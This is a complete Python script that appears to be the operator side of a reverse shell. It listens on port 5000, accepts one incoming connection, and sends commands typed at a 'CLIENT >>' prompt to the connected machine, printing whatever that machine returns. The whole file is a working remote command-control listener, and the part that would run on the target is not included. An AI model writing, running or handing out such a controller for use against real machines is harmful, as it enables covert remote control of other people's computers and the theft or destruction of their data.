import socket
import sys

# Create a socket
def create_socket():
	try:
		global host
		global port
		global s
		host = ''
		port = 5000
		s = socket.socket()
		print('socket created')

	except socket.error as err:
		print(f'Socket creation error: {str(err)}')


# Bind socket to port and wait for connection from client
def bind_socket():
	try:
		print(f'Binding socket to port: {str(port)}')
		s.bind((host, port))
		s.listen(5)

	except socket.error as err:
		print(f'Socket binding error: {str(err)}')
		print('Retrying...')
		bind_socket()


# Establish a connection with client and send commands
def accept_socket():
	conn, address = s.accept()
	print(f'Connection has been established with: IP = {address[0]}, Port: {address[1]}')
	send_commands(conn)
	conn.close()



# Send commands
def send_commands(conn):
	while True:
		cmd = input("CLIENT >>").strip()
		if cmd == 'q':
			conn.close()
			s.close()
			sys.exit()

		if len(str.encode(cmd)) > 0:
			conn.send(str.encode(cmd))
			client_response = conn.recv(1024)
			print(client_response.decode('cp1252'), end ='')

# Main function
def main():
	create_socket()
	bind_socket()
	accept_socket()

if __name__ == '__main__':
	main()

